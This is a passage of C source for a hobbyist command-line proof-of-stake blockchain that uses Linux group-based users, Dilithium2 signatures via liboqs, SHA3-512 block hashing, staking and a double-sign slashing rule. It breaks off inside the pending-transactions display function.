#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>       // For getpass()
#include <pwd.h>          // For getpwnam()
#include <grp.h>          // For getgrnam()
#include <time.h>         // For time functions
#include <signal.h>       // For signal handling
#include <fcntl.h>        // For file operations
#include <sys/file.h>     // For file locking
#include <sys/stat.h>     // For mkdir()
#include <dirent.h>       // For directory operations
#include <openssl/sha.h>  // For SHA256 hashing
#include <openssl/evp.h>  // For SHA3-512 via OpenSSL EVP interface
#include <security/pam_appl.h>  // For PAM authentication
#include <arpa/inet.h>
#include <sys/socket.h>
#include <shadow.h>

#include <oqs/oqs.h>      // OQS library for Dilithium2

#define MAX_USERNAME_LENGTH 100
#define MAX_PASSWORD_LENGTH 100
#define MAX_RECIPIENT_LENGTH 100
#define BLOCKS_DIR "blocks"
#define TRANSACTION_LOG_FILE "transaction_log.txt"
#define MAX_TRANSACTIONS_PER_BLOCK 5
#define MAX_VALIDATORS_PER_BLOCK 3
#define SERVER_PORT 10010
#define SERVER_ADDR "10.233.105.130"

// -- SIMPLE CONSTANT FOR SLASHING PENALTY --
#define SLASH_PENALTY 5.0   // Slash 5 tokens from stake on double-sign attempt

// Global user/role
char current_user[MAX_USERNAME_LENGTH] = "";
char current_role[20] = "";

// Enum
typedef enum {
    TRANSACTION_NORMAL
} TransactionType;

// Transaction struct
typedef struct Transaction {
    int id;
    TransactionType type;
    char sender[MAX_USERNAME_LENGTH];
    char recipient[MAX_RECIPIENT_LENGTH];
    double amount;
    time_t timestamp;
    struct Transaction *next;
} Transaction;

// Block struct
typedef struct Block {
    int index;
    time_t timestamp;
    Transaction transactions[MAX_TRANSACTIONS_PER_BLOCK];
    int transaction_count;
    unsigned char previous_hash[64];
    unsigned char hash[64];
    unsigned int hash_len;

    int validator_count;
    char validators[MAX_VALIDATORS_PER_BLOCK][MAX_USERNAME_LENGTH];

    unsigned char signatures[MAX_VALIDATORS_PER_BLOCK][5000];
    size_t signature_lens[MAX_VALIDATORS_PER_BLOCK];

    struct Block *next;
} Block;

// User struct
typedef struct User {
    char username[MAX_USERNAME_LENGTH];
    double balance;
    double stake;  
    unsigned char public_key[5000];
    size_t public_key_len;
    struct User *next;
} User;

// Global pointers
Block *blockchain = NULL;
Transaction *pending_transactions = NULL;
User *users = NULL;
int last_transaction_id = 0;
Block *pending_block = NULL;

// Prototypes
int ensure_blocks_directory();
int is_user_in_group(const char *username, const char *groupname);
int is_user_in_blockusers_group(const char *username);
void load_blockusers_into_users();

void add_user_if_not_exists(const char *username);
void generate_keys_for_user(const char *username);
void load_user_public_key(struct User *user);

void compute_block_hash(Block *block);
void create_genesis_block();
void load_blockchain();
void load_validator_public_keys(Block *block);

void display_blockchain();
void print_hash(unsigned char *hash, unsigned int hash_len);
void print_block_signature(Block *block);
void display_dilithium2_signature_for_block(int block_index);

void add_block_to_blockchain(Block *new_block);
void create_new_block();
void finalize_block();
void sign_block(Block *block, const char *validator_username);
int verify_block_signatures(Block *block);
void sign_pending_block(const char *validator_username);

void save_pending_block();
void load_pending_block();

void add_transaction(Transaction *new_transaction);
void send_transaction();
void view_transactions();
void view_all_transactions();
void view_pending_transactions();
void cancel_pending_transaction();

void update_user_balance(const char *username, double amount);
double get_user_balance(const char *username);
void request_test_funds();
void log_event(const char *event_description);

void user_login();
void user_logout();

// Staking
void stake_tokens(const char *username, double amount);
void unstake_tokens(const char *username, double amount);

// Slashing
void slash_user_stake(const char *username, double penalty);

struct User* find_user(const char *username);

double compute_vrf(const char *username, int round);
void select_validators(char selected_validators[MAX_VALIDATORS_PER_BLOCK][MAX_USERNAME_LENGTH],
                       int *validator_count);
void check_and_create_block();

void cleanup_blockchain();
void cleanup_pending_transactions();
void cleanup_users();
void cleanup_and_exit(int signum);

int pam_conversation(int num_msg, const struct pam_message **msg,
                     struct pam_response **resp, void *appdata_ptr);

//================= MAIN ====================
int main() {
    int choice;

    if (ensure_blocks_directory() != 0) {
        printf("Failed to create/access blocks dir.\n");
        exit(1);
    }

    // Load blockusers & blockchain
    load_blockusers_into_users();
    load_blockchain();

    signal(SIGINT, cleanup_and_exit);
    signal(SIGTERM, cleanup_and_exit);

    while(1) {
        printf("\n--- Simple Login & Blockchain (with Slashing) ---\n");
        if(strlen(current_user)>0) {
            // Logged in
            printf("Logged in as: %s (%s)\n", current_user, current_role);
            printf("Balance: %.2f tokens\n", get_user_balance(current_user));
            User *u = find_user(current_user);
            if(u) {
                printf("Staked: %.2f tokens\n", u->stake);
            }

            printf("1. Logout\n");
            printf("2. Send Transaction\n");
            printf("3. View My Transactions\n");
            printf("4. View All Transactions\n");
            printf("5. Display Blockchain\n");
            printf("6. Exit\n");
            printf("7. Request Test Tokens\n");
            printf("8. View Pending Transactions\n");
            printf("9. Cancel Pending Transaction\n");
            printf("10. Check Validator Status and Create Block\n");
            printf("11. Display Block Signature\n");
            printf("12. Stake Tokens\n");
            printf("13. Unstake Tokens\n");

            printf("Enter choice: ");
            if(scanf("%d",&choice)!=1){
                printf("Invalid input.\n");
                while(getchar()!='\n');
                continue;
            }
            while(getchar()!='\n');

            switch(choice){
                case 1: user_logout(); break;
                case 2: send_transaction(); break;
                case 3: view_transactions(); break;
                case 4: view_all_transactions(); break;
                case 5: display_blockchain(); break;
                case 6: cleanup_and_exit(0); break;
                case 7: request_test_funds(); break;
                case 8: view_pending_transactions(); break;
                case 9: cancel_pending_transaction(); break;
                case 10: check_and_create_block(); break;
                case 11: {
                    int block_index;
                    printf("Enter block index: ");
                    if(scanf("%d",&block_index)!=1){
                        printf("Invalid.\n");
                        while(getchar()!='\n');
                        break;
                    }
                    while(getchar()!='\n');
                    display_dilithium2_signature_for_block(block_index);
                } break;
                case 12: {
                    double amt;
                    printf("Enter amount to stake: ");
                    if(scanf("%lf",&amt)!=1){
                        printf("Invalid.\n");
                        while(getchar()!='\n');
                        break;
                    }
                    stake_tokens(current_user,amt);
                } break;
                case 13: {
                    double amt;
                    printf("Enter amount to unstake: ");
                    if(scanf("%lf",&amt)!=1){
                        printf("Invalid.\n");
                        while(getchar()!='\n');
                        break;
                    }
                    unstake_tokens(current_user,amt);
                } break;
                default: printf("Invalid choice.\n");
            }
        } else {
            // Not logged in
            printf("1. Login\n");
            printf("2. View All Transactions\n");
            printf("3. Display Blockchain\n");
            printf("4. View Pending Transactions\n");
            printf("5. Exit\n");

            printf("Enter choice: ");
            if(scanf("%d",&choice)!=1){
                printf("Invalid.\n");
                while(getchar()!='\n');
                continue;
            }
            while(getchar()!='\n');

            switch(choice){
                case 1: user_login(); break;
                case 2: view_all_transactions(); break;
                case 3: display_blockchain(); break;
                case 4: view_pending_transactions(); break;
                case 5: cleanup_and_exit(0); break;
                default: printf("Invalid choice.\n");
            }
        }
    }
    return 0;
}

//================= BLOCKUSERS + GROUPS ===================

int ensure_blocks_directory(){
    struct stat st;
    if(stat(BLOCKS_DIR,&st)==-1){
        if(mkdir(BLOCKS_DIR,0700)!=0){
            perror("mkdir");
            return -1;
        }
    }
    return 0;
}

int is_user_in_group(const char *username, const char *groupname){
    struct group*grp = getgrnam(groupname);
    if(!grp) return 0;

    struct passwd *pwd = getpwnam(username);
    if(pwd && pwd->pw_gid==grp->gr_gid){
        return 1;
    }
    char **members=grp->gr_mem;
    while(*members){
        if(strcmp(*members,username)==0){
            return 1;
        }
        members++;
    }
    return 0;
}

int is_user_in_blockusers_group(const char *username){
    return is_user_in_group(username,"blockusers");
}

void load_blockusers_into_users(){
    printf("load_blockusers_into_users: scanning system...\n");
    struct passwd *pwd;
    setpwent();
    while((pwd=getpwent())!=NULL){
        if(is_user_in_blockusers_group(pwd->pw_name)){
            add_user_if_not_exists(pwd->pw_name);
        }
    }
    endpwent();
}

//================= USER MANAGEMENT ===================

void add_user_if_not_exists(const char *username){
    User*u=users;
    while(u){
        if(strcmp(u->username,username)==0){
            return;
        }
        u=u->next;
    }
    User*newu=(User*)malloc(sizeof(User));
    strncpy(newu->username,username,MAX_USERNAME_LENGTH-1);
    newu->username[MAX_USERNAME_LENGTH-1]='\0';
    newu->balance=0.0;
    newu->stake=0.0;
    newu->public_key_len=0;
    newu->next=users;
    users=newu;

    load_user_public_key(newu);
}

void generate_keys_for_user(const char *username){
    struct passwd *pwd=getpwnam(username);
    if(!pwd){
        printf("No home dir for '%s'.\n", username);
        exit(1);
    }

    char keys_dir[512];
    snprintf(keys_dir,sizeof(keys_dir),"%s/.blockchain_keys",pwd->pw_dir);
    struct stat st;
    if(stat(keys_dir,&st)==-1){
        if(mkdir(keys_dir,0700)!=0){
            printf("Failed to create keys_dir '%s'.\n", keys_dir);
            exit(1);
        }
    }

    char privkey[256], pubkey[256];
    snprintf(privkey,sizeof(privkey),"%s/%s_private.key", keys_dir, username);
    snprintf(pubkey,sizeof(pubkey),"%s/%s_public.key", keys_dir, username);

    if(access(privkey,F_OK)!=-1 && access(pubkey,F_OK)!=-1){
        printf("Keys already exist for '%s'.\n", username);
        return;
    }

    OQS_SIG* sig=OQS_SIG_new("Dilithium2");
    if(!sig){
        printf("Dilithium2 init fail.\n");
        exit(1);
    }
    unsigned char *pub=malloc(sig->length_public_key);
    unsigned char *priv=malloc(sig->length_secret_key);
    if(OQS_SIG_keypair(sig,pub,priv)!=OQS_SUCCESS){
        printf("Failed keypair for '%s'.\n", username);
        exit(1);
    }
    FILE*fp=fopen(privkey,"wb");
    if(!fp){
        printf("Failed open '%s'.\n", privkey);
        exit(1);
    }
    fwrite(priv,1,sig->length_secret_key,fp);
    fclose(fp);
    chmod(privkey,0600);

    fp=fopen(pubkey,"wb");
    if(!fp){
        printf("Failed open '%s'.\n", pubkey);
        exit(1);
    }
    fwrite(pub,1,sig->length_public_key,fp);
    fclose(fp);
    chmod(pubkey,0644);

    OQS_SIG_free(sig);
    free(pub);
    free(priv);
    printf("Generated Dilithium2 keys for '%s'.\n", username);
}

void load_user_public_key(User *user){
    struct passwd*pwd=getpwnam(user->username);
    if(!pwd){
        user->public_key_len=0;
        return;
    }
    char pkey[256];
    snprintf(pkey,sizeof(pkey),"%s/.blockchain_keys/%s_public.key",
             pwd->pw_dir, user->username);

    if(access(pkey,F_OK)!=-1){
        FILE*fp=fopen(pkey,"rb");
        if(!fp){
            user->public_key_len=0;
            return;
        }
        fseek(fp,0,SEEK_END);
        user->public_key_len=ftell(fp);
        fseek(fp,0,SEEK_SET);
        fread(user->public_key,1,user->public_key_len,fp);
        fclose(fp);
        printf("Loaded public key for '%s'.\n", user->username);
    } else {
        memset(user->public_key,0,sizeof(user->public_key));
        user->public_key_len=0;
        printf("No public key for '%s'.\n", user->username);
    }
}

User* find_user(const char*username){
    User*u=users;
    while(u){
        if(strcmp(u->username,username)==0){
            return u;
        }
        u=u->next;
    }
    return NULL;
}

//================= BLOCK & TRANSACTION ===================

void compute_block_hash(Block *block){
    unsigned char input[8192];
    size_t off=0;

    memcpy(input+off,&block->index,sizeof(block->index));
    off+=sizeof(block->index);

    memcpy(input+off,&block->timestamp,sizeof(block->timestamp));
    off+=sizeof(block->timestamp);

    for(int i=0;i<block->transaction_count;i++){
        Transaction *tx=&block->transactions[i];
        memcpy(input+off,&tx->id,sizeof(tx->id)); off+=sizeof(tx->id);
        memcpy(input+off,&tx->type,sizeof(tx->type)); off+=sizeof(tx->type);

        size_t s_len=strlen(tx->sender)+1;
        memcpy(input+off,tx->sender,s_len);
        off+=s_len;

        size_t r_len=strlen(tx->recipient)+1;
        memcpy(input+off,tx->recipient,r_len);
        off+=r_len;

        memcpy(input+off,&tx->amount,sizeof(tx->amount)); off+=sizeof(tx->amount);
        memcpy(input+off,&tx->timestamp,sizeof(tx->timestamp)); off+=sizeof(tx->timestamp);
    }

    memcpy(input+off,block->previous_hash,block->hash_len);
    off+=block->hash_len;

    for(int i=0;i<block->validator_count;i++){
        size_t val_len=strlen(block->validators[i])+1;
        memcpy(input+off,block->validators[i],val_len);
        off+=val_len;
    }

    EVP_MD_CTX*md=EVP_MD_CTX_new();
    EVP_DigestInit_ex(md,EVP_sha3_512(),NULL);
    EVP_DigestUpdate(md,input,off);
    unsigned int hl;
    EVP_DigestFinal_ex(md,block->hash,&hl);
    EVP_MD_CTX_free(md);
    block->hash_len=hl;
}

void create_genesis_block(){
    Block*g=malloc(sizeof(Block));
    g->index=0;
    g->timestamp=time(NULL);
    g->transaction_count=0;
    memset(g->previous_hash,0,sizeof(g->previous_hash));
    g->hash_len=0;

    g->validator_count=0;
    memset(g->validators,0,sizeof(g->validators));
    memset(g->signatures,0,sizeof(g->signatures));
    memset(g->signature_lens,0,sizeof(g->signature_lens));

    compute_block_hash(g);
    g->next=NULL;
    blockchain=g;

    char fn[256];
    snprintf(fn,sizeof(fn),"%s/block_0.dat", BLOCKS_DIR);
    FILE*fp=fopen(fn,"wb");
    if(!fp){
        printf("Unable to create genesis block file.\n");
        return;
    }
    fwrite(g,sizeof(Block),1,fp);
    fclose(fp);
    printf("Genesis block created.\n");
}

void load_blockchain(){
    DIR*dir=opendir(BLOCKS_DIR);
    if(!dir){
        printf("No blocks dir. Creating genesis.\n");
        create_genesis_block();
        return;
    }

    struct dirent *entry;
    int block_idxs[1000];
    int bc=0;
    while((entry=readdir(dir))!=NULL){
        if(strncmp(entry->d_name,"block_",6)==0){
            int idx=atoi(entry->d_name+6);
            block_idxs[bc++]=idx;
        }
    }
    closedir(dir);
    if(bc==0){
        printf("No block files. Creating genesis.\n");
        create_genesis_block();
        return;
    }
    // sort
    for(int i=0;i<bc-1;i++){
        for(int j=i+1;j<bc;j++){
            if(block_idxs[i]>block_idxs[j]){
                int t=block_idxs[i];
                block_idxs[i]=block_idxs[j];
                block_idxs[j]=t;
            }
        }
    }

    Block*prev=NULL;
    for(int i=0;i<bc;i++){
        char fn[256];
        snprintf(fn,sizeof(fn),"%s/block_%d.dat", BLOCKS_DIR, block_idxs[i]);
        FILE*fp=fopen(fn,"rb");
        if(!fp){
            printf("Failed open block file '%s'.\n", fn);
            exit(1);
        }
        Block*blk=malloc(sizeof(Block));
        if(!blk){
            printf("OOM block.\n");
            fclose(fp);
            exit(1);
        }
        size_t r=fread(blk,sizeof(Block),1,fp);
        fclose(fp);
        if(r==0){
            free(blk);
            printf("Fail read block '%s'.\n", fn);
            exit(1);
        }
        blk->next=NULL;
        if(!prev){
            blockchain=blk;
        } else {
            prev->next=blk;
        }
        prev=blk;

        load_validator_public_keys(blk);
        if(blk->index!=0){
            if(!verify_block_signatures(blk)){
                printf("Invalid signature for block %d.\n", blk->index);
                exit(1);
            }
        }
        // update balances
        for(int t=0;t<blk->transaction_count;t++){
            Transaction*tx=&blk->transactions[t];
            if(strlen(tx->sender)>0){
                update_user_balance(tx->sender,-tx->amount);
            }
            update_user_balance(tx->recipient,tx->amount);
        }
    }
    printf("Blockchain loaded.\n");
}

void load_validator_public_keys(Block *block){
    for(int i=0;i<block->validator_count;i++){
        const char *val = block->validators[i];
        User*u=users;
        while(u){
            if(strcmp(u->username,val)==0) break;
            u=u->next;
        }
        if(!u){
            add_user_if_not_exists(val);
        } else {
            if(u->public_key_len==0){
                load_user_public_key(u);
            }
        }
    }
}

void display_blockchain(){
    printf("display_blockchain:\n");
    Block*b=blockchain;
    while(b){
        printf("\nBlock Index: %d\n", b->index);
        printf("Timestamp: %s", ctime(&b->timestamp));
        printf("Validators: ");
        for(int i=0;i<b->validator_count;i++){
            printf("%s ", b->validators[i]);
        }
        printf("\nPrev Hash: ");
        print_hash(b->previous_hash,b->hash_len);
        printf("\nHash: ");
        print_hash(b->hash,b->hash_len);
        printf("\nTransactions:\n");
        for(int i=0;i<b->transaction_count;i++){
            Transaction*tx=&b->transactions[i];
            char ts[26]; ctime_r(&tx->timestamp,ts);
            ts[strlen(ts)-1]='\0';

            if(strlen(tx->sender)==0){
                printf("  [%s] ID:%d Sys->%s Amt:%.2f\n",
                       ts,tx->id,tx->recipient,tx->amount);
            } else {
                printf("  [%s] ID:%d From:%s To:%s Amt:%.2f\n",
                       ts,tx->id,tx->sender,tx->recipient,tx->amount);
            }
        }
        printf("Signatures:\n");
        for(int i=0;i<b->validator_count;i++){
            printf("Validator '%s' Signature:\n", b->validators[i]);
            if(b->signature_lens[i]==0){
                printf("  None.\n");
                continue;
            }
            for(size_t j=0;j<b->signature_lens[i];j++){
                printf("%02x",b->signatures[i][j]);
                if((j+1)%32==0) printf("\n");
            }
            if(b->signature_lens[i]%32!=0) printf("\n");
        }
        b=b->next;
    }
}

void print_hash(unsigned char*hash, unsigned int hash_len){
    for(unsigned int i=0;i<hash_len;i++){
        printf("%02x",hash[i]);
    }
}

void print_block_signature(Block *block){
    printf("Block %d Signatures:\n", block->index);
    for(int i=0;i<block->validator_count;i++){
        printf("Validator '%s' Signature:\n", block->validators[i]);
        if(block->signature_lens[i]==0){
            printf("No signature.\n");
            continue;
        }
        for(size_t j=0;j<block->signature_lens[i];j++){
            printf("%02x", block->signatures[i][j]);
            if((j+1)%32==0) printf("\n");
        }
        if(block->signature_lens[i]%32!=0) printf("\n");
    }
    printf("Block %d Hash:\n", block->index);
    for(unsigned int i=0;i<block->hash_len;i++){
        printf("%02x", block->hash[i]);
    }
    printf("\n");

    if(verify_block_signatures(block)){
        printf("All signatures valid.\n");
    } else {
        printf("Some sig invalid.\n");
    }
}

void display_dilithium2_signature_for_block(int block_index){
    Block*b=blockchain;
    while(b){
        if(b->index==block_index){
            print_block_signature(b);
            return;
        }
        b=b->next;
    }
    printf("Block %d not found.\n", block_index);
}

void add_block_to_blockchain(Block* new_block){
    Block*b=blockchain;
    while(b->next) b=b->next;
    b->next=new_block;
    for(int i=0;i<new_block->transaction_count;i++){
        Transaction*tx=&new_block->transactions[i];
        if(strlen(tx->sender)>0){
            update_user_balance(tx->sender,-tx->amount);
        }
        update_user_balance(tx->recipient,tx->amount);
    }
    char fn[256];
    snprintf(fn,sizeof(fn),"%s/block_%d.dat",BLOCKS_DIR,new_block->index);
    FILE*fp=fopen(fn,"wb");
    if(!fp){
        printf("Unable to create block file idx=%d.\n", new_block->index);
        return;
    }
    fwrite(new_block,sizeof(Block),1,fp);
    fclose(fp);
}

void create_new_block(){
    if(!pending_transactions)return;
    if(pending_block){
        printf("A pending block already exists.\n");
        return;
    }
    printf("create_new_block...\n");

    char selected_validators[MAX_VALIDATORS_PER_BLOCK][MAX_USERNAME_LENGTH];
    int validator_count=0;
    select_validators(selected_validators,&validator_count);

    int is_user_val=0;
    for(int i=0;i<validator_count;i++){
        if(strcmp(current_user,selected_validators[i])==0){
            is_user_val=1;
            break;
        }
    }
    if(!is_user_val){
        printf("User '%s' not among selected. Deferring.\n", current_user);
        return;
    }

    Block*new_block=malloc(sizeof(Block));
    if(!new_block){
        printf("OOM block.\n");
        return;
    }

    Block*last=blockchain;
    while(last->next) last=last->next;
    new_block->index=last->index+1;
    new_block->timestamp=time(NULL);
    new_block->transaction_count=0;

    Transaction*ptx=pending_transactions;
    for(int i=0;i<MAX_TRANSACTIONS_PER_BLOCK && ptx;i++){
        new_block->transactions[i]=*ptx;
        new_block->transaction_count++;
        ptx=ptx->next;
    }

    memcpy(new_block->previous_hash,last->hash,last->hash_len);
    new_block->hash_len=last->hash_len;

    new_block->validator_count=validator_count;
    for(int i=0;i<validator_count;i++){
        strncpy(new_block->validators[i],selected_validators[i],MAX_USERNAME_LENGTH-1);
        new_block->validators[i][MAX_USERNAME_LENGTH-1]='\0';
        new_block->signature_lens[i]=0;
    }
    new_block->next=NULL;

    compute_block_hash(new_block);
    pending_block=new_block;

    save_pending_block();
    sign_pending_block(current_user);
}

void finalize_block(){
    for(int i=0;i<pending_block->transaction_count;i++){
        Transaction*tmp=pending_transactions;
        pending_transactions=pending_transactions->next;
        free(tmp);
    }

    add_block_to_blockchain(pending_block);

    double block_reward=10.0;
    double share=block_reward/pending_block->validator_count;
    for(int i=0;i<pending_block->validator_count;i++){
        update_user_balance(pending_block->validators[i], share);
        printf("Validator '%s' receives %.2f tokens for block %d.\n",
               pending_block->validators[i], share, pending_block->index);
    }
    remove("pending_block.dat");
    printf("Block finalized.\n");
    pending_block=NULL;
}

void sign_block(Block *block, const char *validator_username){
    int vidx=-1;
    for(int i=0;i<block->validator_count;i++){
        if(strcmp(block->validators[i],validator_username)==0){
            vidx=i;break;
        }
    }
    if(vidx==-1){
        printf("User '%s' not a validator.\n", validator_username);
        return;
    }

    struct passwd*pwd=getpwnam(validator_username);
    if(!pwd){
        printf("getpwnam('%s') fail.\n", validator_username);
        exit(1);
    }

    char privkey[256];
    snprintf(privkey,sizeof(privkey),"%s/.blockchain_keys/%s_private.key",
             pwd->pw_dir, validator_username);

    FILE*fp=fopen(privkey,"rb");
    if(!fp){
        printf("Failed open priv key for '%s'.\n", validator_username);
        exit(1);
    }

    OQS_SIG*sig=OQS_SIG_new("Dilithium2");
    if(!sig){
        printf("Dilithium2 init fail.\n");
        exit(1);
    }

    unsigned char *private_key=malloc(sig->length_secret_key);
    if(fread(private_key,1,sig->length_secret_key,fp)!=sig->length_secret_key){
        printf("Fail read private key.\n");
        fclose(fp);
        free(private_key);
        OQS_SIG_free(sig);
        exit(1);
    }
    fclose(fp);

    unsigned char block_data[8192];
    size_t off=0;
    memcpy(block_data+off,&block->index,sizeof(block->index)); off+=sizeof(block->index);
    memcpy(block_data+off,&block->timestamp,sizeof(block->timestamp)); off+=sizeof(block->timestamp);
    memcpy(block_data+off,block->transactions,sizeof(Transaction)*block->transaction_count);
    off+=sizeof(Transaction)*block->transaction_count;
    memcpy(block_data+off,block->previous_hash,block->hash_len); off+=block->hash_len;
    memcpy(block_data+off,block->hash,block->hash_len); off+=block->hash_len;
    for(int i=0;i<block->validator_count;i++){
        size_t ln=strlen(block->validators[i])+1;
        memcpy(block_data+off,block->validators[i],ln);
        off+=ln;
    }

    if(OQS_SIG_sign(sig, block->signatures[vidx], &block->signature_lens[vidx],
                    block_data, off, private_key)!=OQS_SUCCESS){
        printf("Failed signing block.\n");
        free(private_key);
        OQS_SIG_free(sig);
        exit(1);
    }

    printf("Block signed by '%s'.\n", validator_username);
    free(private_key);
    OQS_SIG_free(sig);
}

int verify_block_signatures(Block *block){
    int all_valid=1;
    OQS_SIG*sig=OQS_SIG_new("Dilithium2");
    if(!sig){
        printf("Dilithium2 init fail.\n");
        exit(1);
    }

    unsigned char block_data[8192];
    size_t off=0;
    memcpy(block_data+off,&block->index,sizeof(block->index)); off+=sizeof(block->index);
    memcpy(block_data+off,&block->timestamp,sizeof(block->timestamp)); off+=sizeof(block->timestamp);
    memcpy(block_data+off,block->transactions,sizeof(Transaction)*block->transaction_count);
    off+=sizeof(Transaction)*block->transaction_count;
    memcpy(block_data+off,block->previous_hash,block->hash_len); off+=block->hash_len;
    memcpy(block_data+off,block->hash,block->hash_len); off+=block->hash_len;
    for(int i=0;i<block->validator_count;i++){
        size_t ln=strlen(block->validators[i])+1;
        memcpy(block_data+off,block->validators[i],ln);
        off+=ln;
    }

    for(int i=0;i<block->validator_count;i++){
        User*u=find_user(block->validators[i]);
        if(!u){
            printf("Validator '%s' not found.\n", block->validators[i]);
            all_valid=0;
            continue;
        }
        if(u->public_key_len==0){
            printf("Public key '%s' len=0.\n", u->username);
            all_valid=0;
            continue;
        }
        int r=(OQS_SIG_verify(sig, block_data, off,
                              block->signatures[i], block->signature_lens[i],
                              u->public_key)==OQS_SUCCESS);
        if(r){
            // success
        } else {
            printf("Block %d sig verify fail for '%s'.\n", block->index,u->username);
            all_valid=0;
        }
    }
    OQS_SIG_free(sig);
    return all_valid;
}

void sign_pending_block(const char *validator_username){
    if(!pending_block){
        printf("No pending block.\n");
        return;
    }

    int vidx=-1;
    for(int i=0;i<pending_block->validator_count;i++){
        if(strcmp(pending_block->validators[i],validator_username)==0){
            vidx=i;break;
        }
    }
    if(vidx==-1){
        printf("User '%s' is not validator for pending.\n", validator_username);
        return;
    }

    // -- ADD SLASHING FOR DOUBLE SIGN --
    if(pending_block->signature_lens[vidx]>0){
        printf("User '%s' has ALREADY signed this pending block.\n", validator_username);

        // Slash the user's stake for double-sign attempt
        slash_user_stake(validator_username, SLASH_PENALTY);

        printf("Slashed %.2f from '%s' for double-sign attempt!\n", 
               SLASH_PENALTY, validator_username);
        return;
    }

    // sign normally
    sign_block(pending_block, validator_username);
    save_pending_block();

    printf("User '%s' has signed the pending block.\n", validator_username);

    // check if all signed
    int all_signed=1;
    for(int i=0;i<pending_block->validator_count;i++){
        if(pending_block->signature_lens[i]==0){
            all_signed=0;break;
        }
    }
    if(all_signed){
        printf("All validators signed. Finalizing.\n");
        finalize_block();
    } else {
        printf("Waiting for others.\n");
    }
}

void save_pending_block(){
    if(!pending_block) return;
    FILE*fp=fopen("pending_block.dat","wb");
    if(!fp){
        printf("Unable to save pending block.\n");
        return;
    }
    fwrite(pending_block,sizeof(Block),1,fp);
    fclose(fp);
}

void load_pending_block(){
    FILE*fp=fopen("pending_block.dat","rb");
    if(!fp){
        pending_block=NULL;
        return;
    }
    if(!pending_block){
        pending_block=malloc(sizeof(Block));
        if(!pending_block){
            printf("OOM pending_block.\n");
            fclose(fp);
            return;
        }
    }
    size_t r=fread(pending_block,sizeof(Block),1,fp);
    fclose(fp);
    if(r==0){
        free(pending_block);
        pending_block=NULL;
        printf("Fail read pending.\n");
    }
}

void add_transaction(Transaction*newtx){
    Transaction*pt=pending_transactions;
    if(!pt){
        pending_transactions=newtx;
    } else {
        while(pt->next) pt=pt->next;
        pt->next=newtx;
    }
    int c=0;
    pt=pending_transactions;
    while(pt){
        c++;pt=pt->next;
    }
    printf("Pending tx count: %d\n", c);
    if(c>=MAX_TRANSACTIONS_PER_BLOCK){
        printf("Reached threshold %d.\n", MAX_TRANSACTIONS_PER_BLOCK);
        printf("Selecting next validators...\n");
        char vals[MAX_VALIDATORS_PER_BLOCK][MAX_USERNAME_LENGTH];
        int vcnt=0;
        select_validators(vals,&vcnt);
        if(vcnt>0){
            printf("The next validators are: ");
            for(int i=0;i<vcnt;i++){
                printf("%s ", vals[i]);
            }
            printf("\n");
        } else {
            printf("No validators could be selected.\n");
        }
    }
}

void send_transaction(){
    if(strlen(current_user)==0){
        printf("No user logged in.\n");
        return;
    }
    char recipient[MAX_RECIPIENT_LENGTH];
    double amt;
    printf("Enter recipient username: ");
    scanf("%99s", recipient);
    printf("Enter amount: ");
    if(scanf("%lf",&amt)!=1){
        printf("Invalid.\n");
        while(getchar()!='\n');
        return;
    }
    if(amt<=0){
        printf("Amount must be >0.\n");
        return;
    }
    double bal=get_user_balance(current_user);
    if(amt>bal){
        printf("Insufficient balance.\n");
        return;
    }
    add_user_if_not_exists(recipient);

    Transaction*tx=malloc(sizeof(Transaction));
    tx->id=++last_transaction_id;
    tx->type=TRANSACTION_NORMAL;
    strncpy(tx->sender,current_user,MAX_USERNAME_LENGTH-1);
    tx->sender[MAX_USERNAME_LENGTH-1]='\0';
    strncpy(tx->recipient,recipient,MAX_RECIPIENT_LENGTH-1);
    tx->recipient[MAX_RECIPIENT_LENGTH-1]='\0';
    tx->amount=amt;
    tx->timestamp=time(NULL);
    tx->next=NULL;

    add_transaction(tx);
    printf("TX from '%s' to '%s' amt=%.2f ID=%d\n", current_user, recipient, amt, tx->id);
}

void view_transactions(){
    if(strlen(current_user)==0){
        printf("No user logged in.\n");
        return;
    }
    int found=0;
    Block*b=blockchain;
    while(b){
        for(int i=0;i<b->transaction_count;i++){
            Transaction*tx=&b->transactions[i];
            if(strcmp(tx->sender,current_user)==0 || strcmp(tx->recipient,current_user)==0){
                char ts[26]; ctime_r(&tx->timestamp,ts);
                ts[strlen(ts)-1]='\0';
                if(strlen(tx->sender)==0){
                    printf("[%s] ID:%d Sys->%s Amt:%.2f\n", ts,tx->id,tx->recipient,tx->amount);
                } else {
                    printf("[%s] ID:%d From:%s To:%s Amt:%.2f\n",
                           ts, tx->id, tx->sender, tx->recipient, tx->amount);
                }
                found=1;
            }
        }
        b=b->next;
    }
    Transaction*pt=pending_transactions;
    while(pt){
        if(strcmp(pt->sender,current_user)==0 || strcmp(pt->recipient,current_user)==0){
            char ts[26]; ctime_r(&pt->timestamp,ts);
            ts[strlen(ts)-1]='\0';
            if(strlen(pt->sender)==0){
                printf("[%s] ID:%d Sys->%s Amt:%.2f (Pending)\n",
                       ts,pt->id,pt->recipient,pt->amount);
            } else {
                printf("[%s] ID:%d From:%s To:%s Amt:%.2f (Pending)\n",
                       ts,pt->id,pt->sender,pt->recipient,pt->amount);
            }
            found=1;
        }
        pt=pt->next;
    }
    if(!found){
        printf("No transactions for '%s'.\n", current_user);
    }
}

void view_all_transactions(){
    Block*b=blockchain;
    printf("--- All TX ---\n");
    while(b){
        for(int i=0;i<b->transaction_count;i++){
            Transaction*tx=&b->transactions[i];
            char ts[26]; ctime_r(&tx->timestamp,ts);
            ts[strlen(ts)-1]='\0';
            if(strlen(tx->sender)==0){
                printf("[%s] ID:%d Sys->%s Amt:%.2f\n",
                       ts,tx->id,tx->recipient,tx->amount);
            } else {
                printf("[%s] ID:%d From:%s To:%s Amt:%.2f\n",
                       ts,tx->id,tx->sender,tx->recipient,tx->amount);
            }
        }
        b=b->next;
    }
    Transaction*pt=pending_transactions;
    while(pt){
        char ts[26]; ctime_r(&pt->timestamp,ts);
        ts[strlen(ts)-1]='\0';
        if(strlen(pt->sender)==0){
            printf("[%s] ID:%d Sys->%s Amt:%.2f (Pending)\n",
                   ts,pt->id,pt->recipient,pt->amount);
        } else {
            printf("[%s] ID:%d From:%s To:%s Amt:%.2f (Pending)\n",
                   ts,pt->id,pt->sender,pt->recipient,pt->amount);
        }
        pt=pt->next;
    }
}

void view_pending_transactions(){
    if(!pending_transactions){
        printf("No pending transactions.\n");
        return;
    }
    Transaction*pt=pending_transactions;
    while(pt){
